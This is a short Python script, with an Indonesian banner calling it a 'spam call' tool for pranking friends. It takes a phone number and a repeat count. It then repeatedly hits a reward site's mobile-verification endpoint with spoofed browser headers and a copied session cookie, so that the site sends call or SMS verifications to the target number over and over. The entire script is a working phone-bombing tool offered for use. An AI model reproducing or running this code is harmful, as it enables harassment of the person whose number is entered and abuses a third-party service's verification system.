import requests,json,os,time
os.system("clear")
ll = """
----------=----------
______SPAM CALL______
_buat ngeprank temen_
--++---------++------
ext : 89872xxxxxx
"""

print(ll)
nomor = input(" [∆]Nomor : ")
jumlah = int(input(" [∆]Jumlah : "))
ua= {
"Host":"id.jagreward.com",
"Connection":"keep-alive",
"Accept":"*/*",
"X-Requested-With":"XMLHttpRequest",
"Save-Data":"on",
"User-Agent":"Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
"Sec-Fetch-Site":"same-origin",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Dest":"empty",
"Referer":"https://id.jagreward.com/member/register/",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
'Cookie':'PHPSESSID=n0391uejkjincsc7j0ikblmhq2; _ga=GA1.3.1995993945.1608286110; DAPROPS="sjs.webGlRenderer:Adreno (TM) 512|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:2.549999952316284|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _gid=GA1.3.1026501019.1608419498; _gat=1'
}
url = f"https://id.jagreward.com/member/verify-mobile/{nomor}/"
for i in range(int(jumlah)):
  let = requests.get(url,headers=ua).text
  ser = json.loads(let)
  zx = ser["result"]
  xx = ser["message"]
  print(f"Berhasil:{zx},Pesan: {xx}")
  time.sleep(6)
